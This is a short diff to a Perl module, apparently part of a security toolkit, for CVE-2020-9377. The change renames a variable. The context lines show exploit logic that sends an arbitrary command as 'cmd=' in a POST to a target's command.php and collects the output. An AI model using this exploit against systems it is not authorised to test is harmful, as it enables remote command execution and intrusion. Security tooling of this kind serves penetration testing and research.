@@ -22,7 +22,7 @@ package Spellbook::Advisory::CVE_2020_9377 {
                 $target = "http://$target";
             }
 
-            my $userAgent = Spellbook::Core::UserAgent -> new();
+            my $user_agent = Spellbook::Core::UserAgent -> new();
             my $payload   = "cmd=$command";
 
             my $headers   = HTTP::Headers -> new (
@@ -31,7 +31,7 @@ package Spellbook::Advisory::CVE_2020_9377 {
             );
 
             my $request   = HTTP::Request -> new("POST", "$target/command.php", $headers, $payload);
-            my $response  = $userAgent -> request($request);
+            my $response  = $user_agent -> request($request);
 
             if ($response -> code() == 200) {
                 push @results, $response -> content();
